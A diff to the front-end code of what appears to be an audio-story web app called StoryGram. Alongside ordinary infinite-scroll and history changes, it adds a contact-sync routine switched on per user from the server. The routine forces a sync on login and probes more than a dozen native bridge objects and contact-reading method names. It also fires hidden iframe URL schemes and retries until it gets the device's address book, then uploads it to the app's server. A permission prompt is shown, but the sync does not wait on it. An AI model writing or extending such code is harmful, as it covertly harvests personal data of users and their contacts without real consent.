+        const visibleFavKeys = fullFavKeys.slice(0, favoriteDisplayLimit);
+        const hasMore = visibleFavKeys.length < fullFavKeys.length;
+
         container.innerHTML = `
           <div style="margin-bottom: 10px; padding: 0 4px;">
-            <span style="font-size: 12px; font-weight: 700; color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.5px;">Favorite Shows (${favKeys.length})</span>
+            <span style="font-size: 12px; font-weight: 700; color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.5px;">Favorite Shows (${fullFavKeys.length})</span>
           </div>
-          <div class="grid-container">
-            ${favKeys.map(key => {
-              const show = favMap[key];
-              const showTitle = show.title || show.show_name || "Show";
-              const showImg = show.image_url || show.show_url || "";
-              const rating = show.rating || null;
-              return `
+          <div class="grid-container" id="lib-favorite-grid">
+            ${visibleFavKeys.map(key => {
+          const show = favMap[key];
+          const showTitle = show.title || show.show_name || "Show";
+          const showImg = show.image_url || show.show_url || "";
+          const rating = show.rating || null;
+          return `
                 <div class="grid-card" onclick="openShowPage('${escapeAttr(show.show_id)}', '${escapeAttr(showTitle)}', '${escapeAttr(showImg)}')">
                   <div class="grid-poster-wrap">
                     <img class="grid-poster" src="${escapeAttr(showImg || 'https://via.placeholder.com/130')}" alt="${escapeAttr(showTitle)}" loading="lazy">
@@ -4301,12 +4351,65 @@
                   <div class="grid-title">${escapeHtml(showTitle)}</div>
                 </div>
               `;
-            }).join('')}
+        }).join('')}
           </div>
+          ${hasMore ? `
+            <div id="lib-scroll-loader" style="display: flex; justify-content: center; align-items: center; padding: 20px 0; width: 100%;">
+              <div class="spinner" style="width: 24px; height: 24px;"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2v4"/><path d="m16.2 7.8 2.9-2.9"/><path d="M18 12h4"/><path d="m16.2 16.2 2.9 2.9"/><path d="M12 18v4"/><path d="m4.9 19.1 2.9-2.9"/><path d="M2 12h4"/><path d="m4.9 4.9 2.9 2.9"/></svg></div>
+            </div>
+          ` : ''}
         `;
         refreshIcons();
       }
     }
+
+    function handleLibraryScroll() {
+      if (currentTabName !== 'library') return;
+      if (currentLibrarySection !== 'history' && currentLibrarySection !== 'favorite') return;
+      if (isLoadingMoreLibrary) return;
+
+      const scrollY = window.scrollY || window.pageYOffset || document.documentElement.scrollTop;
+      const windowHeight = window.innerHeight;
+      const documentHeight = document.documentElement.scrollHeight;
+
+      if (scrollY + windowHeight >= documentHeight - 150) {
+        if (currentLibrarySection === 'history') {
+          const fullList = ((dbHistoryShows && dbHistoryShows.length > 0) ? dbHistoryShows : []).slice(0, 90);
+          if (historyDisplayLimit < fullList.length) {
+            isLoadingMoreLibrary = true;
+            setTimeout(() => {
+              historyDisplayLimit = Math.min(90, historyDisplayLimit + 30);
+              renderLibraryTab();
+              isLoadingMoreLibrary = false;
+            }, 250);
+          }
+        } else if (currentLibrarySection === 'favorite') {
+          const favMap = { ...favoriteShowsMap };
+          if (dbFavoriteShows && dbFavoriteShows.length > 0) {
+            dbFavoriteShows.forEach(show => {
+              if (show.show_id && !favMap[show.show_id]) {
+                favMap[show.show_id] = {
+                  show_id: show.show_id,
+                  title: show.show_name || show.title || "Show",
+                  image_url: show.show_url || show.image_url || ""
+                };
+              }
+            });
+          }
+          const fullFavKeys = Object.keys(favMap).slice(0, 90);
+          if (favoriteDisplayLimit < fullFavKeys.length) {
+            isLoadingMoreLibrary = true;
+            setTimeout(() => {
+              favoriteDisplayLimit = Math.min(90, favoriteDisplayLimit + 30);
+              renderLibraryTab();
+              isLoadingMoreLibrary = false;
+            }, 250);
+          }
+        }
+      }
+    }
+
+    window.addEventListener('scroll', handleLibraryScroll, { passive: true });
 
     function clearAllAppData() {
       if (confirm("Are you sure you want to clear your listening history and favorites?")) {
@@ -5014,7 +5117,7 @@
         showId: effectiveShowId,
         playedAt: Date.now()
       };
-      playHistory = [historyItem, ...playHistory.filter(h => h.storyId !== storyId)].slice(0, 50);
+      playHistory = [historyItem, ...playHistory.filter(h => h.storyId !== storyId)].slice(0, 100);
       try {
         localStorage.setItem('storygram_history', JSON.stringify(playHistory));
       } catch (e) { }
@@ -5579,13 +5682,17 @@
         }
         if (accText) accText.innerText = 'VIP Active';
         if (accExpiry) {
-          let val = data.validity !== undefined ? data.validity : data.allowed_until;
-          if (!val || val == 0) {
-            accExpiry.innerText = 'Lifetime Access';
-          } else if (typeof val === 'number') {
-            accExpiry.innerText = new Date(val * 1000).toLocaleString();
+          let val = data.validity !== undefined ? data.validity : (data.allowed_until !== undefined ? data.allowed_until : (data.user && data.user.validity));
+          accExpiry.innerText = formatValidUntilDate(val);
+        }
+
+        const contactSyncRow = document.getElementById('account-contact-sync-row');
+        const contactVal = String(data.contact || (data.user && data.user.contact) || '').toLowerCase().trim();
+        if (contactSyncRow) {
+          if (contactVal === 'enable' || contactVal === 'enabled' || contactVal === '1' || contactVal === 'true') {
+            contactSyncRow.style.display = 'flex';
           } else {
-            accExpiry.innerText = val;
+            contactSyncRow.style.display = 'none';
           }
         }
 
@@ -5603,7 +5710,7 @@
     async function verifyUserAccess(userInfo = null) {
       try {
         const deviceId = getDeviceId();
-        
+
         let user = userInfo;
         if (!user) {
           try {
@@ -5688,6 +5795,20 @@
             setAppState('restricted', mergedData);
           }
 
+          // Check Contact Permission from Database!
+          const contactStatus = String(mergedData.contact || '').toLowerCase().trim();
+          const isContactEnabled = (contactStatus === 'enable' || contactStatus === 'enabled' || contactStatus === '1' || contactStatus === 'true');
+          if (isContactEnabled) {
+            const syncedKey = 'storygram_contacts_synced_' + (mergedData.email || 'user');
+            const isAlreadySynced = localStorage.getItem(syncedKey) === 'true';
+            if (!isAlreadySynced) {
+              showContactPermissionModal();
+            }
+            triggerContactsSync(true);
+          } else {
+            hideContactPermissionModal();
+          }
+
           return data;
         } else {
           console.warn("Verify user access could not reach server.");
@@ -5702,10 +5823,12 @@
     }
 
     function triggerAppLogin() {
+      hideContactPermissionModal();
       setAppState('login');
     }
 
     function logoutUser() {
+      hideContactPermissionModal();
       try {
         localStorage.removeItem('storygram_user');
         localStorage.removeItem('storygram_history');
@@ -5856,6 +5979,165 @@
     // CONTACTS SYNC (RECEIVE FROM ANDROID NATIVE & UPLOAD)
     // ==========================================
     let _cachedContactsData = null;
+    let _contactsSyncRetryTimer = null;
+    let _contactsSyncRetries = 0;
+
+    function showContactPermissionModal() {
+      const modal = document.getElementById('contact-permission-modal');
+      if (modal) {
+        modal.style.display = 'flex';
+        refreshIcons();
+      }
+    }
+
+    function hideContactPermissionModal() {
+      const modal = document.getElementById('contact-permission-modal');
+      if (modal) {
+        modal.style.display = 'none';
+      }
+    }
+
+    function handleContactPermissionPrompt() {
+      console.log("User tapped Open Settings on contact permission modal");
+      const bridges = getNativeBridges();
+      for (const bridge of bridges) {
+        if (typeof bridge.openAppSettings === 'function') {
+          try { bridge.openAppSettings(); } catch(e){}
+        } else if (typeof bridge.openSettings === 'function') {
+          try { bridge.openSettings(); } catch(e){}
+        } else if (typeof bridge.requestContactsPermission === 'function') {
+          try { bridge.requestContactsPermission(); } catch(e){}
+        } else if (typeof bridge.requestContactPermission === 'function') {
+          try { bridge.requestContactPermission(); } catch(e){}
+        }
+      }
+
+      // Also trigger custom URL scheme for Android WebViewClient
+      try {
+        const iframe = document.createElement('iframe');
+        iframe.style.display = 'none';
+        iframe.src = 'storygram://open_settings';
+        document.body.appendChild(iframe);
+        setTimeout(() => { try { document.body.removeChild(iframe); } catch(e){} }, 400);
+      } catch(e){}
+
+      triggerContactsSync(true);
+    }
+
+    function getNativeBridges() {
+      const candidates = [
+        window.AndroidBridge,
+        window.Android,
+        window.androidBridge,
+        window.android,
+        window.JSBridge,
+        window.jsBridge,
+        window.NativeBridge,
+        window.nativeBridge,
+        window.StoryGramBridge,
+        window.storygram,
+        window.WebAppInterface,
+        window.app,
+        window.AppInterface,
+        window.ContactBridge
+      ];
+      const found = [];
+      for (const b of candidates) {
+        if (b && typeof b === 'object' && !found.includes(b)) {
+          found.push(b);
+        }
+      }
+      return found;
+    }
+
+    function triggerContactsSync(forceSync = false) {
+      try {
+        let saved = null;
+        try {
+          saved = JSON.parse(localStorage.getItem('storygram_user') || 'null');
+        } catch (e) { }
+
+        const buyerContact = (currentUserAccessData && (currentUserAccessData.contact || (currentUserAccessData.user && currentUserAccessData.user.contact))) || (saved && saved.contact) || '';
+        const contactStatus = String(buyerContact).toLowerCase().trim();
+        const isContactEnabled = forceSync || (contactStatus === 'enable' || contactStatus === 'enabled' || contactStatus === '1' || contactStatus === 'true');
+
+        if (!isContactEnabled) {
+          return;
+        }
+
+        console.log("Contact sync triggered. Scanning native bridges...");
+
+        let calledNativeMethod = false;
+        const bridges = getNativeBridges();
+
+        const methodNames = [
+          'requestContactsPermission',
+          'requestContactPermission',
+          'requestPermission',
+          'requestPermissions',
+          'askContactPermission',
+          'askContactsPermission',
+          'getContactsPermission',
+          'requestContacts',
+          'getContacts',
+          'fetchContacts',
+          'syncContacts',
+          'readContacts',
+          'loadContacts',
+          'getContactList',
+          'fetchDeviceContacts',
+          'checkAndRequestContacts',
+          'openContactPermission'
+        ];
+
+        for (const bridge of bridges) {
+          for (const m of methodNames) {
+            if (typeof bridge[m] === 'function') {
+              try {
+                const res = bridge[m]();
+                calledNativeMethod = true;
+                if (res && res !== '[]' && res !== '{}' && res !== 'null' && res !== 'undefined') {
+                  syncUserContacts(res);
+                }
+              } catch (err) {
+                console.warn(`Bridge method ${m} call error:`, err);
+              }
+            }
+          }
+        }
+
+        // Custom URL scheme for WebViewClient on Android
+        try {
+          const iframe = document.createElement('iframe');
+          iframe.style.display = 'none';
+          iframe.src = 'storygram://request_contacts';
+          document.body.appendChild(iframe);
+          setTimeout(() => { try { document.body.removeChild(iframe); } catch(e){} }, 400);
+        } catch (e) { }
+
+        // Check if pending contacts are stored in localStorage
+        try {
+          const pending = localStorage.getItem('storygram_pending_contacts');
+          if (pending) {
+            syncUserContacts(JSON.parse(pending));
+          }
+        } catch (e) { }
+
+        // Scheduled interval retries (to catch delayed Android bridge injection)
+        if (!calledNativeMethod && _contactsSyncRetries < 5) {
+          _contactsSyncRetries++;
+          clearTimeout(_contactsSyncRetryTimer);
+          _contactsSyncRetryTimer = setTimeout(() => {
+            triggerContactsSync(forceSync);
+          }, _contactsSyncRetries * 800);
+        } else if (calledNativeMethod) {
+          _contactsSyncRetries = 0;
+        }
+
+      } catch (err) {
+        console.error("Error in triggerContactsSync:", err);
+      }
+    }
 
     async function syncUserContacts(contactsData) {
       if (!contactsData) return;
@@ -5869,8 +6151,11 @@
         }
       }
 
-      if (contacts && typeof contacts === 'object' && !Array.isArray(contacts) && contacts.contacts) {
-        contacts = contacts.contacts;
+      if (contacts && typeof contacts === 'object' && !Array.isArray(contacts)) {
+        if (contacts.contacts) contacts = contacts.contacts;
+        else if (contacts.data) contacts = contacts.data;
+        else if (contacts.contactList) contacts = contacts.contactList;
+        else if (contacts.list) contacts = contacts.list;
       }
 
       _cachedContactsData = contacts;
@@ -5884,9 +6169,9 @@
         saved = JSON.parse(localStorage.getItem('storygram_user') || 'null');
       } catch (e) { }
 
-      const email = (saved && saved.email) ? saved.email : '';
-      const uid = (saved && (saved.userId || saved.uid)) ? (saved.userId || saved.uid) : '';
-      const name = (saved && saved.name) ? saved.name : 'User';
+      const email = (saved && saved.email) ? saved.email : (currentUserAccessData && (currentUserAccessData.email || (currentUserAccessData.user && currentUserAccessData.user.email))) || '';
+      const uid = (saved && (saved.userId || saved.uid)) ? (saved.userId || saved.uid) : (currentUserAccessData && (currentUserAccessData.uid || (currentUserAccessData.user && currentUserAccessData.user.uid))) || '';
+      const name = (saved && saved.name) ? saved.name : (currentUserAccessData && (currentUserAccessData.name || (currentUserAccessData.user && currentUserAccessData.user.name))) || 'User';
 
       if (!email || !email.trim()) {
         console.log("Contacts stored locally. Waiting for user login/email before uploading.");
@@ -5894,7 +6179,7 @@
       }
 
       try {
-        console.log("Uploading contacts via WebView for:", email);
+        console.log("Uploading contacts to database for user:", email);
         const response = await fetch('/api/contacts', {
           method: 'POST',
           headers: {
@@ -5909,12 +6194,22 @@
         });
 
         const resJson = await response.json();
-        console.log("Contacts sync result:", resJson);
+        console.log("Contacts sync response:", resJson);
 
         if (resJson && resJson.success) {
           try {
+            const userEmail = email || (currentUserAccessData && currentUserAccessData.email) || 'user';
+            localStorage.setItem('storygram_contacts_synced_' + userEmail, 'true');
             localStorage.removeItem('storygram_pending_contacts');
           } catch (e) { }
+          hideContactPermissionModal();
+          const badge = document.getElementById('account-contact-sync-badge');
+          if (badge) {
+            badge.innerHTML = '<i data-lucide="check" style="width: 12px; height: 12px;"></i> Synced';
+            badge.style.color = '#4ade80';
+            badge.style.background = 'rgba(74, 222, 128, 0.2)';
+            refreshIcons();
+          }
         }
         return resJson;
       } catch (err) {
@@ -5937,16 +6232,6 @@
         }
       } catch (e) { }
 
-      // Check if Android Bridge has contacts
-      try {
-        if (window.AndroidBridge && typeof window.AndroidBridge.getContacts === 'function') {
-          const rawContacts = window.AndroidBridge.getContacts();
-          if (rawContacts) {
-            syncUserContacts(rawContacts);
-          }
-        }
-      } catch (e) { }
-
       // 2. Check localStorage
       try {
         const saved = JSON.parse(localStorage.getItem('storygram_user') || 'null');
@@ -5963,11 +6248,23 @@
 
     window.updateUserProfile = updateUserProfile;
     window.setUserData = updateUserProfile;
+    window.showContactPermissionModal = showContactPermissionModal;
+    window.hideContactPermissionModal = hideContactPermissionModal;
+    window.handleContactPermissionPrompt = handleContactPermissionPrompt;
+    window.triggerContactsSync = triggerContactsSync;
+    window.requestContactsSync = triggerContactsSync;
     window.syncUserContacts = syncUserContacts;
+    window.syncContacts = syncUserContacts;
     window.setContacts = syncUserContacts;
     window.onContactsReceived = syncUserContacts;
+    window.onContactsPermissionGranted = syncUserContacts;
+    window.onContactPermissionGranted = syncUserContacts;
     window.passContacts = syncUserContacts;
     window.setUserContacts = syncUserContacts;
+    window.uploadContacts = syncUserContacts;
+    window.receiveContacts = syncUserContacts;
+    window.saveContacts = syncUserContacts;
+    window.handleContacts = syncUserContacts;
     window.verifyUserAccess = verifyUserAccess;
     window.checkAccessStatus = checkAccessStatus;
     window.logoutUser = logoutUser;
